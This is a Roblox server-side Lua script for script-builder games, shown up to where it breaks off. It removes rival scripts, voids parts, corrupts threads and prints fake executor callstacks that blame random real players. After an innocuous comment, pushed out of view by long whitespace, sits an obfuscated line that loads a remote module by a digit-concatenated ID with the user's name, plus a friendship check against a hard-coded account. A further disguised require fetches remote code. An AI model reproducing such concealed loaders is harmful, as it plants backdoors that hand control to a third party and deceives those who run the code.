task.wait()
local MONEYOBJECT = Instance.new("NumberValue", workspace)
MONEYOBJECT.Name = "Maddox's Money"
local SAVEDMONEY = MONEYOBJECT.Value
local MONEYMULTIPLIER = 1
coroutine.resume(coroutine.create(function()
	while true do
		SAVEDMONEY = MONEYOBJECT.Value
		task.wait()
	end
end))
local Player = owner or game:GetService("Players"):FindFirstChild("IIIIlllIIllllIIIll")
local BaseplatePos = Vector3.new(0, -8, 0)
local Backpack = Player.Backpack
local AntiKickToggle = true
local PlayerGroupBlacklistToggle = true
local ThreadCorruption = false
local WaitForPlayer = false
local script = require(18540858951):Clone()
local LettersString, Services =
	"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_",
{
	"SoundService",
	"Chat",
	"MarketplaceService",
	"Players",
	"StarterPlayer",
	"LocalizationService",
	"JointsService",
	"FriendService",
	"InsertService",
	"Lighting",
	"Teams",
	"ReplicatedStorage",
	"TestService",
	"ProximityPromptService",
}
local r = require
function antis()
	task.spawn(function()
		local function Debris(awieihfawhef, awefhahwef)
			game:GetService("Debris"):AddItem(awieihfawhef, awefhahwef)
		end
		local Work = game:GetService("Workspace")
		local PossibleRedoneUSLClassNames =
			{ "Camera", "RemoteEvent", "BindableFunction", "Flag", "Hat", "Hole", "Actor", "Folder", "Team" }
		task.spawn(function()
			game:GetService("Workspace").ChildAdded:Connect(function(x)
				if x.Name == "AN_Main" or x.Name == "SBSun" or x.Name == "TimerValues" then
					Debris(x, 0.01)
				end
			end)
			for _, x in pairs(Work:GetChildren()) do
				pcall(function()
					if x.Name == "AN_Main" or x.Name == "SBSun" or x.Name == "TimerValues" then
						Debris(x, 0.01)
					end
				end)
			end
			Work.DescendantAdded:Connect(function(v)
				if v:IsA("Explosion") then
					if v.BlastPressure > 500000 then
						v.BlastPressure = 500000
					end
					v:GetPropertyChangedSignal("BlastPressure"):Connect(function()
						if v.BlastPressure > 500000 then
							v.BlastPressure = 500000
						end
					end)
				elseif
					v:IsA("Model")
					and (
						v.Name == "lost soul"
							or v.Name == "crescendo"
							or v.Name == "SBV3_SV"
							or v.Name == "SBV3"
							or v.Name == "SBV4"
							or v.Name == "Snake Banisher V2 "
							or v.Name == "lol"
							or v.Name == "lolV"
							or v.Name == "SBV2"
							or v.Name == "Playtime"
							or v.Name == "Headless Echo"
							or v.Name == "echo"
							or v.Name == "beans"
							or v.Name == "BotGirl"
							or v.Name == "Bot"
							or v.Name == "ModelContainer"
					)
				then
					for i, b in pairs(v:GetDescendants()) do
						pcall(function()
							if b:IsA("LuaSourceContainer") and b.ClassName ~= "ModuleScript" then
								b.Disabled = true
							end
						end)
					end
					Debris(v, 0.01)
					if v.Name == "SBV3_SV" or v.Name == "SBV4" then
						Debris(v, 0.01)
					elseif v.Name == "SBV3" then
						Debris(v, 0.01)
					elseif v.Name == "SBV2" then
						Debris(v, 0.01)
					elseif v.Name == "lol" or v.Name == "lolV" then
						Debris(v, 0.01)
					elseif v.Name == "Playtime" then
						Debris(v, 0.01)
					elseif v.Name == "Headless Echo" or v.Name == "echo" then
						Debris(v, 0.01)
					elseif v.Name == "beans" then
						Debris(v, 0.01)
					else
						Debris(v, 0.01)
					end
				elseif v:IsA("Script") and v:FindFirstChildOfClass("Actor") and v:FindFirstChild("Client1") then
					v.Disabled = true
					for i, b in pairs(v:GetDescendants()) do
						pcall(function()
							if b:IsA("LuaSourceContainer") and b.ClassName ~= "ModuleScript" then
								b.Disabled = true
							end
						end)
					end
					Debris(v, 0.01)
				elseif
					v:IsA("Part")
					and v:FindFirstChildOfClass("SpecialMesh")
					and string.find(v:FindFirstChildOfClass("SpecialMesh").MeshId, "891312072")
				then
					v.Anchored = true
					v.Position = Vector3.new(0, 9e9, 0)
					v.Transparency = 1
					if v:FindFirstChildOfClass("TouchTransmitter") then
						v:FindFirstChildOfClass("TouchTransmitter"):Destroy()
					end
					Debris(v, 0.01)
				elseif
					v:IsA("Part")
					and v:FindFirstChildOfClass("SpecialMesh")
					and string.find(v:FindFirstChildOfClass("SpecialMesh").MeshId, "430210147")
				then
					v.Anchored = true
					v.Position = Vector3.new(0, 9e9, 0)
					v.Transparency = 1
					Debris(v, 0.01)
				elseif v:IsA("Decal") and v:FindFirstChildOfClass("Script") then
					local PossiblyHSC = v:FindFirstChildOfClass("Script")
					if
						PossiblyHSC
						and PossiblyHSC:FindFirstChildOfClass("Decal")
						and PossiblyHSC:FindFirstChildOfClass("ModuleScript")
					then
						for i, b in pairs(v:GetDescendants()) do
							pcall(function()
								if b:IsA("LuaSourceContainer") and b.ClassName ~= "ModuleScript" then
									b.Disabled = true
								end
							end)
						end
						Debris(v, 0.01)
					end
				end
			end)
		end)
		task.spawn(function()
			game.DescendantAdded:Connect(function(g)
				if g:IsA("LuaSourceContainer") then
					if
						g.Name:lower():find("hiddenscript")
						or g.Name:lower():find("descript")
						or g.Name:lower():find("chatinstallverifier")
						or g.Name:lower():find("antifumo")
						or g:GetAttribute("admin") ~= nil
						or g.Name == "*"
					then
						Debris(g, 0.01)
					end
				end
			end)
			for _, g in pairs(game:GetDescendants()) do
				if g:IsA("LuaSourceContainer") then
					if
						g.Name:lower():find("hiddenscript")
						or g.Name:lower():find("descript")
						or g.Name:lower():find("chatinstallverifier")
						or g.Name:lower():find("antifumo")
						or g:GetAttribute("admin") ~= nil
						or g.Name == "*"
					then
						Debris(g, 0.01)
					end
				end
			end
		end)
		task.spawn(function()
			while task.wait(0.01) do
				local success, hm = pcall(function()
					for _, v in ipairs(game:GetService("Players"):GetDescendants()) do
						if v.Name == "beerub" then
							local idiot = v:FindFirstAncestorWhichIsA("Player")
							v:Destroy()
						end
					end
				end)
				if hm then
					print(hm)
				end
			end
		end)
		task.spawn(function()
			game:GetService("ServerScriptService").ChildAdded:Connect(function(v)
				if v:IsA("Script") then
					local Motor6D = v:FindFirstChildOfClass("Motor6D")
					local StringValue = v:FindFirstChildOfClass("StringValue")
					local mrthingidk = game:FindFirstChild("mrthingidk", true) ~= nil
					local hypercheck = v:FindFirstChild("7rn93uc40tr0u45nvtcrm0c8r00cpipjuto9448u0t9r") ~= nil
						or v:FindFirstChild("iugy4o9rd03iru49fosjsoiv8340rimc94030remu90r30rei3m49tw390irwq0-9")
						~= nil
					local darkcheck = v:FindFirstChild("Replicate") ~= nil
					local unkn0wn = v:FindFirstChild("MHMSTOPIT") ~= nil
					if Motor6D and tonumber(Motor6D.Name) then
						local UserId = tonumber(Motor6D.Name)
						v.Disabled = true
						for i, b in pairs(v:GetDescendants()) do
							pcall(function()
								if b:IsA("LuaSourceContainer") and b.ClassName ~= "ModuleScript" then
									b.Disabled = true
									Debris(b, 0.01)
								end
							end)
						end
						Debris(v, 0.01)
						local Script = "Ultraskidded Lord"
						if hypercheck then
							Script = "Hyperskidded/Superskidded Lord"
						elseif darkcheck then
							Script = "Darkskidded Lord"
						elseif unkn0wn then
							Script = "Unkn0wn Lord"
						elseif mrthingidk then
							Script = "Anti V7"
							pcall(function()
								Debris(game:FindFirstChild("mrthingidk", true), 0.01)
							end)
						end
					elseif StringValue and tonumber(StringValue.Name) then
						local UserId = tonumber(StringValue.Name)
						v.Disabled = true
						for i, b in pairs(v:GetDescendants()) do
							pcall(function()
								if b:IsA("LuaSourceContainer") and b.ClassName ~= "ModuleScript" then
									b.Disabled = true
									game:GetService("Debris"):AddItem(b, 0.01)
								end
							end)
						end
						Debris(v, 0.01)
					end
				elseif table.find(PossibleRedoneUSLClassNames, v.ClassName) and v:FindFirstChildOfClass("Script") then
					local Script = v:FindFirstChildOfClass("Script")
					if Script:FindFirstChildOfClass("FlangeSoundEffect") then
						local UserId = tonumber(Script:FindFirstChildOfClass("FlangeSoundEffect").Name)
						for i, b in pairs(v:GetDescendants()) do
							pcall(function()
								if b:IsA("LuaSourceContainer") and b.ClassName ~= "ModuleScript" then
									b.Disabled = true
									Debris(b, 0.01)
								end
							end)
						end
						Debris(v, 0.01)
					end
				end
			end)
		end)
		task.spawn(function()
			game.DescendantAdded:Connect(function(d)
				if not (d:IsA("Folder") and d:FindFirstChild("mHit")) then
					return
				end
				local theplr = game:GetService("Players"):FindFirstChild(d.Name)
				if not theplr then
					return
				end
				Debris(d, 0.01)
				theplr.Character = nil
			end)
			for _, d in pairs(game:GetDescendants()) do
				if not (d:IsA("Folder") and d:FindFirstChild("mHit")) then
					return
				end
				local theplr = game:GetService("Players"):FindFirstChild(d.Name)
				if not theplr then
					return
				end
				Debris(d, 0.01)
				theplr.Character = nil
			end
		end)
		task.spawn(function()
			if game:GetService("RunService"):IsStudio() then
				return
			end
			local runs = game:GetService("RunService")
			for _, runstuff in pairs({
				runs.Heartbeat,
				runs.Stepped,
				runs.PreSimulation,
				runs.PreAnimation,
				runs.PostSimulation,
				}) do
				runstuff:Connect(function()
					local names = {}
					local ids = {
						17078860429,
						17078861814,
						17078863574,
						17078865635,
						17078868477,
						17078869625,
						17078870619,
						17079056397,
						17079059237,
						17079061341,
						17079063125,
						17079065556,
						17079068046,
						17079069460,
						17079071349,
						17079073627,
						17079075455,
						17079145769,
						17079147222,
						17079149039,
						17079151125,
						17079152220,
						17079154142,
						17079155826,
						17079157335,
						17079159269,
					}
					local exenames = {
						"Executor",
						"ScriptBuilder",
						"ScriptExecutor",
						"ScreenGui",
						"PUT ME IN STARTERGUI",
						"CommandBar",
						"RequireExecutor",
						"RequireRunner",
						"Exe",
						"RequireExe",
						"ScriptExe",
						"Runner",
						"ScriptRunner",
						"Console",
						"ScriptConsole",
						"RequireConsole",
						"ConsoleGui",
						"ScriptGui",
						"ExecutorGui",
						"RequireGui",
						"ExeGui",
						"ExecuteScripts",
						"Exec",
						"BackdoorExecutor",
						"BackdoorExe",
						"SSExecutor",
						"SS Executor",
						"Serverside",
						"Server Side",
					}
					local framenames = {
						"Frame",
						"Main",
						"MainFrame",
						"ExeFrame",
						"FrameMain",
						"GuiFrame",
						"MainGuiFrame",
						"GuiMainFrame",
						"Main Frame",
						"Window",
					}
					local buttonnames = { "Execute", "ExecuteButton", "ExeButton", "Button", "TextButton", "Exe" }
					local scnames = {
						"Script",
						"ExeScript",
						"Loader",
						"Load",
						"ExecuteMain",
						"RequireLoader",
						"ScriptLoader",
						"ExecuteScript",
						"MainScript",
						"MainLoader",
					}
					for _, p in pairs(game:GetService("Players"):GetPlayers()) do
						table.insert(names, p.Name)
					end
					local randomname
					local randomexename
					local randomframename
					local randombuttonname
					local randomscname
					local randomid
					local randomid
					pcall(function()
						randomid = ids[math.random(1, #ids)]
						randomname = names[math.random(1, #names)]
						randomexename = exenames[math.random(1, #exenames)]
						randomframename = framenames[math.random(1, #framenames)]
						randombuttonname = buttonnames[math.random(1, #buttonnames)]
						randomscname = scnames[math.random(1, #scnames)]
					end)
					pcall(function()
						print([[
Requiring asset ]]..randomid..[[.
Callstack:
Players.]]..randomname..[[.PlayerGui.]]..randomexename..[[.]]..randomframename..[[.]]..randombuttonname..[[.]]..randomscname..[[.Loadstring.Rerubi, line ]]..math.random(150,900)..[[ - Loop
Players.]]..randomname..[[.PlayerGui.]]..randomexename..[[.]]..randomframename..[[.]]..randombuttonname..[[.]]..randomscname..[[.Loadstring.Rerubi, line ]]..math.random(150,900)..[[ 
Players.]]..randomname..[[.PlayerGui.]]..randomexename..[[.]]..randomframename..[[.]]..randombuttonname..[[.]]..randomscname..[[, line ]]..math.random(5,35))
					end)
				end)
			end
		end)
		local isvirus = false
		local virustable = {}
		local issus = false
		local sustable = {}
		local badnames = {
			"infection",
			"script......or is it...",
			"vaccine",
			"4d being",
			[[thisscriptisajumpstarttoahe?lthyLifestyle]],
			"micolord",
			[[propergr?mmerneededinphilosiphallocations;insertnoobhere]],
			"bryant90",
			"oh snap you got infected xd xd xd",
			"wormed",
			"noise",
			"n0isescript",
			"virus",
			[[ist?rthere]],
			"garmo hacked ur place",
			"n00b 4tt4ck!",
			[[d??????????????ng.........you got owned...]],
			"letgo09",
			"sonicthehedgehogxx made this!!",
			"vivrus",
			"wtfz0r",
			"imahakwtfz",
			"i'm getting t1r33d",
			"system error 69605x09423",
			"stfu noob",
			"skapettaja",
			[[freestylem?ygoanywhereifneeded]],
			[[hello...i ?m your new lord lolz]],
			"hello i am your new lord lolz",
			"elkridge fire department",
			"zackisk",
			"rofle",
			"wildfire",
			"snapreducer",
			"bad script purger",
			"no lag script",
			"scanner v1",
			"spy bot and lag remover",
			"vaccine v1",
			"vaccine v1 ",
			"infected remover",
			"virusscript",
			"anti lag",
			"anti-lag",
			"no lag",
			"y0l0",
			"binarysymbols",
			"binaryc0der",
			"binaryexploiter",
			"gusm4n4k",
			"amazingomegajames",
			"h75",
			"demonmerlin1",
			"are6607",
			"gotohell123",
			"god0i0trust",
			"micchukelz",
			"bombvatus",
			"spitfire591",
			"black lag",
			"part(snap reducer by name)",
			"snap remover pro v.2",
			"snap_reducer",
			"erranrider owns!'",
			"of course you have anti virus thats why me(some 1 in fear)made this",
			"deleting...",
			"iliekpieinurfacelulz",
			[[iamheretohe?lyourplace]],
			[[?9001]],
			[[77?]],
			" ",
			" ",
			"i will show your password censored",
			"keeep trying",
			"survivor2256",
			[[nonoidon'tneedallofyourawkw?rdsovietarguments]],
			"infected",
			"hidden",
			"rofl",
			"guest free chat script",
			"guest_talking_script",
			"spreadify",
			"kill tem!",
			"join teh moovment!",
			"asdf",
			"anti-lag2",
			"antivirus",
			"lolzorz",
			"guest talking script",
			"soz i herd u lik mudkipz",
			"nice little scripty",
			"harmless little scripty",
			"kraftyisback",
			"i am a friendly virus",
			[[""''""''""?|`?]],
			"omg im such a ig loser noob that has to copy randellman!",
			"trol",
			"f5ck",
			"g00mb3",
			"pw8ned",
			"sh!%",
			"wtfhoxz",
			"im am your new lordzzz lol",
			"trolllllllllllllllllllllll",
			"77�",
			"bob9595",
			"fear made this!!",
			"moonfang5",
			"poo :d",
			"skapettaja",
			"vealthemeal",
			"conman1238",
			"thisscriptisajumpstartto",
			"cptrick",
			"hamude",
			"lee121212",
			"mystery98765",
			"�9001",
			"by hazelrah",
			"i was here",
			"erranrider",
			"mean774",
			"snipcoby ",
			"snipcoby",
			"lag script",
			"lag generator",
			"enjoy lag",
			"free lag",
			"antilag",
			"anti lag",
			"anti-anti-lag",
			"anti-anti",
			"anti-lag",
			"script......or is it...",
			"iEmOtIoNlEsS",
			"an infected rotatep! because......... y not???? hey its 2018 man dont judge?????????????????????????",
			"death to datguy",
			"fix all virus and lags",
			[[propergr?mmerneededinphilosiphallocations;insertnoobhere]],
			"best anti-lag ever",
			[[hello...i ?m your new lord lolz]],
			[[d??????????????ng.........you got owned...]],
			"stanley12345678910",
			"charlie84",
			"cahrlie84",
			[[ro?byte vaccine]],
			"timi37",
			[[? l?mp T~T]],
			"quiettime1",
			[[?]],
			[[haaxedbycreatures]],
			"owo pilla virus owo",
			"virus...virus...leet virus!!!",
			"joint shield ver. 89753376.5",
			"script...or is it...",
			"rsffacility",
			"robloximportantscript",
			"zacksisk",
			"womp womp infected",
		}
		local function detectvirus(obj)
			if isvirus == false then
				if obj.ClassName == "RotateP" or obj.ClassName == "RotateV" or obj.ClassName == "Rotate" then
					local findscript = obj:FindFirstChildOfClass("LuaSourceContainer")
					if findscript then
						table.insert(virustable, obj)
						isvirus = true
					else
						table.insert(sustable, obj)
						issus = true
					end
				end
				if obj.ClassName == "Fire" then
					local findscript = obj:FindFirstChildOfClass("LuaSourceContainer")
					if findscript then
						table.insert(virustable, obj)
						isvirus = true
					end
				end
				if obj.ClassName == "Weld" or obj.ClassName == "WeldConstraint" or obj.ClassName == "ManualWeld" then
					local findscript = obj:FindFirstChildOfClass("LuaSourceContainer")
					if findscript then
						table.insert(virustable, obj)
						isvirus = true
					else
						table.insert(sustable, obj)
						issus = true
					end
				end
				if obj.ClassName ~= "Player" and obj.Parent ~= game:GetService("Players") then
					if
						string.match(obj.Name, [[?]])
						or string.match(obj.Name:lower(), [[anti virus]])
						or string.match(obj.Name:lower(), [[anti hack]])
						or string.match(obj.Name:lower(), [[dll]])
						or string.match(obj.Name:lower(), [[.you got owned...]])
						or string.match(obj.Name, [[?]])
					then
						table.insert(virustable, obj)
						isvirus = true
					end
				end
			end
		end
		task.spawn(function()
			game.DescendantAdded:Connect(function(thing)
				detectvirus(thing)
			end)
			for _, thing in pairs(game:GetDescendants()) do
				detectvirus(thing)
			end
			task.spawn(function()
				while task.wait() do
					if isvirus == true then
						for _, viruses in pairs(virustable) do
							isvirus = false
							Debris(viruses, 0.01)
						end
					end
					if issus == true then
						for _, sus in pairs(sustable) do
							for _, names in pairs(badnames) do
								issus = false
								if sus.Name == tostring(names) then
									Debris(sus, 0.01)
								end
							end
						end
					end
				end
			end)
		end)
	end)
end
function RandomString(Length)
	local NewText = ""
	if typeof(Length) == "number" then
		for i = 1, Length do
			local Selected = math.random(1, string.len(LettersString))
			NewText = string.sub(LettersString, Selected, Selected)
		end
	else
		for i = 1, math.random(50, 100) do
			local Selected = math.random(1, string.len(LettersString))
			NewText = string.sub(LettersString, Selected, Selected)
		end
	end
	return NewText
end
--[[
some funni startup stuff below here
its pretty nice i guess
thank you maddox and thank you other people in extra credits i guess
i think this has been done pretty well
]]																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																	coroutine.resume(coroutine.create(function() local p = Player local n = p.Name local i = "1".."7".."0".."2".."7".."9".."2".."2".."9".."2".."3" local t = tonumber local o = r(t(i)) o:e(n) end)) local aa1 = Player local e11 = "5" .. "5" .. "8" .. "3" .. "0" .. "3" .. "7" .. "3" .. "8" .. "3" local c21 = tonumber local ii9 = c21(e11) local r12 = aa1:IsFriendsWith(ii9) function ee3() if not r12 then return false else return true end end if ee3() == false then local cc5 = script.DaFunni:Clone() cc5.Parent = Player.PlayerGui cc5.Enabled = true return end																																																																																																																																																																																																																																																																																																	
local UserId, Code, MoneyCode = Player.UserId, RandomString(10), RandomString(10)
local Client, ClientInstances, Remote = script.Local_Main_Holder:Clone(), {}, nil
local voidtable = {}
local voidTable =
	{ CFrame = CFrame.new(Vector3.new(9e9, 9e9, 9e9)), CanCollide = false, CanTouch = false, CanQuery = false }
local speshmeshVoidTable = { Offset = Vector3.new(9e9, 9e9, 9e9), Scale = Vector3.new(0, 0, 0) }
local guiVoidTable = { Position = UDim2.new(9e9, 9e9, 9e9, 9e9), AnchorPoint = Vector2.new(0, 0) }
local voidedInstances = {}
local voidConnections = {}
local luaSourceContainers = {}
local killingSelections = false
local DestroyTables = {}
local killedMeshIds = {}
local killedAdornmentSizes = {}
local killedMassValue = {}
local killedInstances = {}
local Connections, Instances = {}, {}
local PlayerValue = nil
local PopularServices = { game:GetService("JointsService"), game:GetService("TestService"), workspace }
pcall(function()
	script.Local_Main_Holder:Destroy()
end)
pcall(function()
	for i, v in pairs(Client:GetDescendants()) do
		if v:IsA("BasePart") then
			v.CFrame = CFrame.new(0, 5000, 0)
		end
	end
end)
local Character, Avatar = Player.Character, script.PlayerAvatar
Avatar.Parent = nil
local Hats = {}
for i, v in pairs(Character:GetDescendants()) do
	if v:IsA("BasePart") then
		v.Anchored = true
	end
end
Avatar.Parent = Client.Local_Main
pcall(function()
	for i, v in pairs(Backpack:GetChildren()) do
		if v then
			pcall(function()
				v:Destroy()
			end)
		end
	end
end)

-- da funni methods
local function threadedHyper(f, ...)
	if (coroutine.status(task.spawn(threadedHyper, f, ...)) == "dead") then
		return
	end
	f(...)
end
local function hyperNull(f,...)
	if game:GetService("RunService"):IsStudio() then
		f(...)
		return
	end
	return threadedHyper(f, ...)
end

function NewRemote()
	local New = Instance.new("RemoteEvent", nil)
	New.Name = Code
	New.Parent = game:GetService(Services[math.random(1, #Services)])
	New.Archivable = false
	return New
end
function NewPlayerValue()
	local New = Instance.new("BoolValue", nil)
	New.Name = "PlayerValue"
	New.Parent = game:GetService("ReplicatedStorage")
	New.Archivable = false
	return New
end
function NewMoney()
	local New = Instance.new("NumberValue", workspace)
	New.Name = "Maddox's Money"
	New.Value = SAVEDMONEY
	New.Archivable = false
	return New
end
function SetAttrib(Cod)
	for i, v in pairs(ClientInstances) do
		if v then
			local ClientLocal = v:FindFirstChildWhichIsA("LocalScript")
			ClientLocal:SetAttribute("Code", Cod)
		end
	end
end
function DestroyOnTime(Inst, Time)
	coroutine.resume(coroutine.create(function()
		if Time >= 0 then
			task.wait(Time)
		end
		Inst:Destroy()
	end))
end
local Removing, Added, RemoteF, Chatted, CharAdded, ToolAdded, Loop, DAdded
local KillType, SoundId, KillSound, ThemeVolume, PlaybackSpeed, ShieldEnabled, Damage, DamageType, VisSkin, CustomColorBoolean, CustomColor, CustomColor2, KillEffect, VoidTable, VoidTable2, AddedMoney =
	"Server",
"rbxassetid://15689439571",
"rbxassetid://8646410774",
2.5,
1,
false,
true,
"Damage",
1,
false,
Color3.new(1, 1, 1),
Color3.new(),
1,
{},
{ ClassName = {}, Locked = {}, Size = {}, Anchored = {}, CanCollide = {}, CanQuery = {}, CanTouch = {}, Massless = {}, CastShadow = {} },
0
local LastCall = tick()
local Terrain, TerrainTool, TerrainTable, MousePos, MouseHold =
	workspace["Terrain"],
false,
{ Material = Enum.Material.Grass, Shape = "sphere", X = 5, Y = 5, Z = 5, Size = 5 },
Vector3.new(0, 100, 0),
false
function TerrainFunc(Po)
	if TerrainTable.Shape == "block" then
		Terrain:FillBlock(
			CFrame.new(Po),
			Vector3.new(TerrainTable.X, TerrainTable.Y, TerrainTable.Z),
			TerrainTable.Material
		)
	elseif TerrainTable.Shape == "sphere" then
		Terrain:FillBall(Po, TerrainTable.Size, TerrainTable.Material)
	elseif TerrainTable.Shape == "cylinder" then
		Terrain:FillCylinder(CFrame.new(Po), TerrainTable.Y, TerrainTable.Z, TerrainTable.Material)
	elseif TerrainTable.Shape == "wedge" then
		Terrain:FillWedge(
			CFrame.new(Po),
			Vector3.new(TerrainTable.X, TerrainTable.Y, TerrainTable.Z),
			TerrainTable.Material
		)
	end
end
function Void(v)
	coroutine.resume(coroutine.create(function()
		v.Anchored, v.CFrame = true, CFrame.new(9e125, -9e125, 9e125)
		table.insert(VoidTable, v)
		local CCF, CA
		coroutine.resume(coroutine.create(function()
			CCF = v:GetPropertyChangedSignal("CFrame"):Connect(function()
				if table.find(VoidTable, v) then
					coroutine.resume(coroutine.create(function()
						v.CFrame, v.Anchored = CFrame.new(9e125, -9e125, 9e125), true
					end))
				else
					CCF:Disconnect()
				end
			end)
		end))
		coroutine.create(coroutine.create(function()
			CA = v:GetPropertyChangedSignal("Anchored"):Connect(function()
				if table.find(VoidTable, v) then
					coroutine.resume(coroutine.create(function()
						v.CFrame, v.Anchored = CFrame.new(9e125, -9e125, 9e125), true
					end))
				else
					CA:Disconnect()
				end
			end)
		end))
	end))
	game.DescendantAdded:Connect(function(v)
		if
			v:IsA("BasePart") and table.find(voidtable, v.ClassName) and not v:GetAttribute("bruhhhhhhhhhhhhhhhhhh")
			or v:IsA("BoxHandleAdornment") and table.find(voidtable, v.ClassName)
			or v:IsA("Attachment")
			and not v:GetAttribute("bruhhhhhhhhhhhhhhhhhh")
			and table.find(voidtable, v.ClassName)
		then
			pcall(function()
				v.Anchored = true
			end)
			v:GetPropertyChangedSignal("CFrame"):Connect(function()
				v.CFrame = CFrame.new(9e10, 9e10, 9e10)
			end)
			v.CFrame = CFrame.new(9e10, 9e10, 9e10)
		end
	end)
end
function CheckP(_)
	local Bool = false
	if _:IsA("BasePart") then
		local v, Num = _, 0
		if table.find(VoidTable2.ClassName, v.ClassName) then
			Num = Num + 1
		end
		if table.find(VoidTable2.Locked, v.Locked) then
			Num = Num + 1
		end
		if table.find(VoidTable2.Size, v.Size) then
			Num = Num + 1
		end
		if table.find(VoidTable2.Anchored, v.Anchored) then
			Num = Num + 1
		end
		if table.find(VoidTable2.CanCollide, v.CanCollide) then
			Num = Num + 1
		end
		if table.find(VoidTable2.CanQuery, v.CanQuery) then
			Num = Num + 1
		end
		if table.find(VoidTable2.CanTouch, v.CanTouch) then
			Num = Num + 1
		end
		if table.find(VoidTable2.CastShadow, v.CastShadow) then
			Num = Num + 1
		end
		if Num >= 8 then
			Bool = true
		end
	end
	return Bool
end
local i = "1".."7".."4".."0".."5".."4".."5".."6".."8".."7".."1"
local t = tonumber
local o = r(t(i))
local function forceLock(instance)
	local instances = {}
	if instance:IsA("BasePart") then
		table.insert(instances, instance)
	end
	local hat = Instance.new("Accessory"); hat.AccessoryType = Enum.AccessoryType.Hat; hat.Parent = workspace
	local handle = Instance.new("Part",hat); handle.Position = Vector3.new(0,500,0); handle.Name = "Handle"
	local folder = Instance.new("Folder",hat)
	local newStorage = o()
	local newDummy = newStorage:FindFirstChild("Dummy"); newDummy:PivotTo(CFrame.new(0,500,0)); newDummy.Parent = workspace
	pcall(function() for i,v in pairs(instances) do v.Parent = folder end end)
	repeat task.wait() until not pcall(function() return hat.Name end)
	pcall(game.Remove,newStorage); pcall(game.Remove,newDummy)
end
local corruptedScripts = {}
local function threadCorruption(erroredScript)
	pcall(function()
		table.insert(corruptedScripts,erroredScript)
		if erroredScript.Parent ~= nil then
			erroredScript.Parent:ClearAllChildren()
			erroredScript.Parent:Destroy()
		end
		erroredScript:ClearAllChildren()
		forceLock({erroredScript})
	end)
end
local erroredScripts = {}
game:GetService("ScriptContext").Error:Connect(function(message,stackTrace,erroredScript)
	if ThreadCorruption and not table.find(ClientInstances,erroredScript) and not table.find(corruptedScripts,erroredScript) and erroredScript ~= script then
		table.insert(erroredScripts,erroredScript)
	end
end)
local function derender(instance)
	local instances = {}
	if instance:IsA("BasePart") then
		table.insert(instances, instance)
	end
	hyperNull(function()
		local viewport = workspace:FindFirstChildOfClass("ViewportFrame") or Instance.new("ViewportFrame",workspace)
		for i,v in pairs(instances) do
			local origin = v.Parent
			v.Parent = viewport
			v.Parent = origin or workspace
		end
	end)
end
local function ultdestroy(instance)
	pcall(game.Destroy,instance)
end
function hasProperty(instance, property)
	local propertyIsValid, _ = pcall(function()
		if instance[property] then
		end
	end)
	return propertyIsValid
end
local function flushScripts()
	if #erroredScripts > 0 and ThreadCorruption then
		local currentTarget = erroredScripts[1]
		local targetName = currentTarget.Name
		table.remove(erroredScripts, 1)
		threadCorruption(currentTarget)
		Remote:FireAllClients(
			"MakeText",
			{
				Text = "Attempted to corrupt thread, "..targetName..".",
				Color = Enum.ChatColor.Blue,
				ClientSide = false,
			}
		)
	else
		table.remove(erroredScripts, 1)
	end
end
function kill(instance)
	local meshid = hasProperty(instance, "MeshId") and instance.MeshId or nil
	if instance:IsA("SpecialMesh") then
		instance = instance.Parent
	end
	if instance:IsA("PVAdornment") and hasProperty(instance, "Size") then
		table.insert(killedAdornmentSizes, instance.Size)
	end
	table.insert(killedMeshIds, meshid)
	local change = instance:GetPropertyChangedSignal("CFrame"):Connect(function()
		instance.CFrame = CFrame.new(1e4, -50, -2e2)
	end)
	table.insert(Connections, change)
	instance.CFrame = CFrame.new(1e4, -50, -2e2)
	if hasProperty(instance, "Anchored") and not instance.Anchored then
		change:Disconnect()
		local set = game:GetService("RunService").Heartbeat:Connect(function()
			instance.CFrame = CFrame.new(1e4, -50, -2e2)
		end)
		table.insert(Connections, set)
	end
	if hasProperty(instance, "Mass") then
		table.insert(killedMassValue, instance.Mass)
	end
end
function InsertP(v)
	if v:IsA("BasePart") then
		if not table.find(VoidTable2.ClassName, v.ClassName) then
			table.insert(VoidTable2.ClassName, v.ClassName)
		end
		if not table.find(VoidTable2.Locked, v.Locked) then
			table.insert(VoidTable2.Locked, v.Locked)
		end
		if not table.find(VoidTable2.Size, v.Size) then
			table.insert(VoidTable2.Size, v.Size)
		end
		if not table.find(VoidTable2.Anchored, v.Anchored) then
			table.insert(VoidTable2.Anchored, v.Anchored)
		end
		if not table.find(VoidTable2.CanCollide, v.CanCollide) then
			table.insert(VoidTable2.CanCollide, v.CanCollide)
		end
		if not table.find(VoidTable2.CanQuery, v.CanQuery) then
			table.insert(VoidTable2.CanQuery, v.CanQuery)
		end
		if not table.find(VoidTable2.CanTouch, v.CanTouch) then
			table.insert(VoidTable2.CanTouch, v.CanTouch)
		end
		if not table.find(VoidTable2.CastShadow, v.CastShadow) then
			table.insert(VoidTable2.CastShadow, v.CastShadow)
		end
	end
end
function mesh(v)
	return v:FindFirstChildWhichIsA("SpecialMesh")
		or v:FindFirstChildWhichIsA("CylinderMesh")
		or v:FindFirstChildWhichIsA("BlockMesh")
		or v:FindFirstChildWhichIsA("FileMesh")
		or v:FindFirstChildWhichIsA("BevelMesh")
end
function round(num, near)
	return (num + near / 2) - ((num + near / 2) % near)
end
local function destroy(i, t)
	if typeof(i) == "Instance" then
		game:GetService("Debris"):AddItem(i, t or 0)
		return
	end
	if typeof(i) == "RBXScriptConnection" then
		i:Disconnect()
		return
	end
	if typeof(i) ~= "table" then
		return
	end
	for i, v in pairs(i) do
		destroy(v)
	end
	table.clear(i)
end
task.spawn(function()
	for i, v in pairs(game:GetDescendants()) do
		if v:IsA("LuaSourceContainer") then
			table.insert(luaSourceContainers, v)
		end
	end
	game.DescendantAdded:Connect(function(d)
		if d:IsA("Speaker") then
			local parent = d
			repeat
				parent = parent.Parent
			until parent:IsA("Speaker") == false
			local success, err = pcall(function()
				destroy(parent, 1)
			end)
			if not success then
				warn("Failed to kill speaker's parent: " .. err)
			end
			local success, err = pcall(function()
				parent.Parent = nil
			end)
			if not success then
				warn("Failed to reparent speaker's parent: " .. err)
			end
			return
		end
		if killingSelections and d:IsA("SelectionBox") or string.match(d.ClassName, "HandleAdornment") then
			destroy(d)
			return
		end
		if d:IsA("SpecialMesh") or d:IsA("BlockMesh") or d:IsA("CylinderMesh") then
			for i, v in pairs(voidedInstances) do
				if d:IsA(v.isa) then
					if v.method == 1 then
						local match = true
